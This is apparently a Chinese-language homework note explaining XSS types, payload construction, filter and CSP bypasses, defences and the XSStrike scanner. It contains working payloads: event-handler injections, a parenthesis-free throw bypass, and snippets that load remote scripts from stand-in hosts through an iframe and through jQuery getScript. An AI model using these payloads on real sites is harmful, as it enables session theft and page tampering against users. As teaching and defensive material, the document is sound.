---
title: "XSS 跨站脚本攻击：Web 安全领域最普遍且危害最直接的漏洞类型之一"
category: 作业
description: "系统梳理 XSS 的核心概念、分类、利用手法与防御体系，为后续靶场练习与漏洞挖掘建立理论框架。"
published: 2026-11-05
tags: [XSS, Web安全, 跨站脚本, 漏洞原理, 防御措施]
---

**XSS 跨站脚本攻击**

**一、XSS 概述与历史背景**

跨站脚本攻击（Cross-Site Scripting，简称 XSS）是一类注入类漏洞，攻击者将恶意脚本注入到可信网站的页面中，当其他用户访问该页面时，脚本在用户浏览器上下文中执行，从而绕过同源策略的限制。XSS 长期位居 OWASP Top 10 之列，是 Web 安全领域最普遍且危害最直接的漏洞类型之一。

从渗透测试视角看，XSS 的**核心价值**在于绕过同源策略。浏览器允许来自同一域名的脚本访问该域下的 Cookie、DOM 与网络请求，而攻击者通过注入脚本，使恶意代码“继承”了可信站点的信任关系，进而窃取会话凭证、篡改页面内容或发起进一步攻击。

**二、XSS 的分类体系**

**2.1 反射型 XSS（Reflected XSS）**

反射型 XSS 是**最常见**的类型。攻击者构造带有恶意脚本参数的 URL，诱导受害者点击；服务器未对参数进行充分过滤或编码，直接将恶意内容“反射”回响应页面，浏览器将其解析为可执行脚本。

**渗透测试要点：**反射型 XSS 的 Payload 通常位于 URL 查询字符串、路径片段或 POST 表单中，需要服务端“回显”用户输入。测试时优先关注搜索框、错误提示页、跳转参数等回显位置。

**2.2 存储型 XSS（Stored XSS）**

存储型 XSS 的**危害最大**。恶意脚本被持久化存储在服务端（数据库、文件、缓存等），所有访问包含该内容的页面的用户都会触发执行。典型场景包括留言板、用户评论、个人资料字段等。

**存储型 XSS 的利用链**：攻击者提交 Payload → 服务端存储 → 管理员或其他用户访问后台/前台页面 → 脚本执行。若目标为后台管理系统，存储型 XSS 可演变为针对管理员的定向攻击，进而获取后台权限。

**2.3 DOM 型 XSS（DOM-based XSS）**

```
DOM：
DOM 是 Document Object Model（文档对象模型） 的缩写。它是浏览器将 HTML/XML 文档解析后，在内存中构建的一棵树形结构对象，JavaScript 通过这棵树来读取和修改页面内容、结构和样式。

***直观理解
浏览器加载一个 HTML 页面时，大致经历：HTML 文本 → 解析 → 构建 DOM 树 → 渲染页面。DOM 就是这份文档在 JavaScript 眼中的“编程接口”。
例如：
<body>
  <h1>标题</h1>
  <p id="intro">段落</p>
</body>

会被解析成类似这样的树：
document
└── html
    └── body
        ├── h1
        │   └── "标题"
        └── p (id="intro")
            └── "段落"

JavaScript 可以这样操作它：
document.getElementById("intro").innerHTML = "新内容";
document.querySelector("h1").style.color = "red";
```

DOM 型 XSS 由 Amit Klein 于 2005 年识别，其特殊性在于恶意数据不经过服务器响应，而是由客户端 JavaScript 从 DOM 中提取“污点”数据并写入危险“汇点”（sink）导致执行。

典型源点（source）包括 location.href、location.hash、document.referrer、window.name 等；典型汇点包括 innerHTML、document.write、eval、setTimeout（字符串参数形式）等。由于 Payload 位于 # 之后的部分不会发送到服务器，传统服务端 WAF 与日志审计往往无法察觉此类攻击。

**渗透测试要点：**DOM 型 XSS 的测试重心从“服务端回显”转向“前端代码审计”。需关注 JavaScript 中对用户可控数据的读取与写入逻辑，尤其是使用框架（如 React、Vue）时看似安全的 innerHTML 或 dangerouslySetInnerHTML 调用。



**三、XSS 的利用手法与 Payload 构造**

**3.1 基础 Payload 与弹窗验证**

渗透测试中通常以 alert(1)、alert(document.domain) 或 prompt(1) 作为概念验证。最基础的注入形式为 `<script>alert(1)</script>`，但现代过滤机制往往拦截 `<script>` 标签，因此需要掌握替代语法。

**3.2 事件处理器注入**

HTML 事件属性（如 onload、onerror、onmouseover、onfocus）是绕过标签黑名单的常用手段：

    <img src=x onerror=alert(1)>：图片加载失败时触发
    <body onload=alert(1)>：页面加载完成时触发
    <svg/onload=alert(1)>：SVG 标签配合事件属性
    <a href = javascript:alert(1)>：
    点击超链接时触发，利用 javascript: 伪协议执行脚本

PortSwigger 的 XSS Cheat Sheet 维护了极其详尽的事件处理器列表，涵盖 onpointerenter、ontoggle、onbeforetoggle 等鲜为人知的事件。在实战中，当常见事件被过滤时，检索冷门事件往往能找到突破口。

**3.3 编码与混淆绕过**

当应用对关键字进行黑名单过滤时，编码变换是基本绕过策略：

    00 JS编码，HTML实体编码，URL编码，ASCII编码，Unicode编码，Hex编码，Base64绕过...
    
    01 过滤空格：斜杠替换
    
    02 过滤单/双引号：反单引号替换
    
    03 CSP绕过：网站主页面有 CSP 保护，但是通过代码动态生成的 iframe（网页里嵌套的另一个小网页）如果没有设置 CSP 头。
    怎么利用？攻击者先在自己控制的外部服务器上放一个 bypasscsp 文件，然后让主网页嵌套这个外部网页，借机执行恶意代码。
    
    示例代码解释：下面那一大段代码，就是告诉浏览器：“嘿，帮我建一个看不见的 iframe 窗口，去偷偷加载我放在 ./1.txt 里的代码并执行它！”
    
    f=document.createElement("iframe");
    f.id="csp";
    f.src="./1.txt";
    f.onload=()=>{
    	x=document.createElement('script');
    	x.src='//xxxxxx.com/csp/1.js';
    	csp.contentWindow.document.body.appendChild(x)
    };
    document.body.appendChild(f);
    
    04代码库利用：大部分网站会使用 jQuery 这个代码库。如果网站的过滤不严，你可以利用 jQuery 自带的远程加载功能，把别人的恶意脚本拉过来执行。
    
    JavaScript:$.getScript("//xss.com")
    
    #这句代码的意思是：通过 jQuery 的 getScript 方法，去访问并执行 xss.com 这个黑客网站上的脚本。
    
    05 过滤括号：使用throw替换。
    # <script>onerror=alert;throw 1</script>



**四、XSS 的防御体系**
4.1 输出编码（第一道防线）

XSS 的本质是“用户数据被浏览器解释为代码”。因此，在将不可信数据写入 HTML 上下文之前进行实体编码是最根本的防御手段。需根据输出位置选择编码方式：

    HTML 正文：编码 <、>、&、"、'
    HTML 属性：除上述字符外，还需注意属性引号闭合问题
    JavaScript 上下文：使用 JSON 序列化或 JavaScript 转义
    URL 上下文：使用 URL 编码

PHP 中 htmlspecialchars($str, ENT_QUOTES, 'UTF-8') 是常用实现，但需注意 ENT_QUOTES 确保单引号也被转义。

**4.2 内容安全策略（CSP）**

CSP 通过 HTTP 响应头限制浏览器可加载的资源来源与可执行的操作。严格 CSP 的核心配置包括：

    使用 nonce-<随机值> 或 sha256-<哈希> 允许特定脚本
    设置 object-src 'none' 禁用插件
    设置 base-uri 'none' 防止 <base> 标签劫持
    避免 unsafe-inline 与 unsafe-eval

部署 CSP 时建议先使用 Content-Security-Policy-Report-Only 模式观察违规报告，确认策略不影响正常功能后再切换为强制执行模式。

**4.3 HttpOnly Cookie**

为会话 Cookie 设置 HttpOnly 属性后，JavaScript 的 document.cookie 无法读取该 Cookie，从而阻断 XSS 窃取会话凭证的主要路径。这是低成本高收益的缓解措施，但不能替代输出编码——XSS 仍可执行其他恶意操作（如发起同域请求、篡改页面内容）。

**4.4 输入验证与净化**

输入验证应作为辅助手段而非唯一防线。对于必须接受富文本的场景，应使用成熟的白名单净化库（如 DOMPurify），仅保留安全的标签与属性。黑名单过滤极易被绕过，不应作为主要防御策略。



**五、辅助工具--XSStrike**

XSStrike 是一款用 Python 编写的开源跨站脚本（XSS）检测套件，常被描述为“最先进的 XSS 扫描器”。它区别于传统工具的核心在于其**上下文感知**能力：它不会盲目注入大量载荷，而是先分析响应内容，再结合模糊测试引擎生成针对性载荷，以提高检测的准确率。

```
常用命令示例：

扫描单个 URL：
xsstrike -u "http://target.com/search?q=test"

测试 POST 数据：
xsstrike -u "http://target.com/feedback" --data "comment=test"

爬取全站并测试：
xsstrike -u "http://target.com" --crawl -l 3

盲打 XSS 模式：
xsstrike -u "http://target.com" --crawl --blind
```

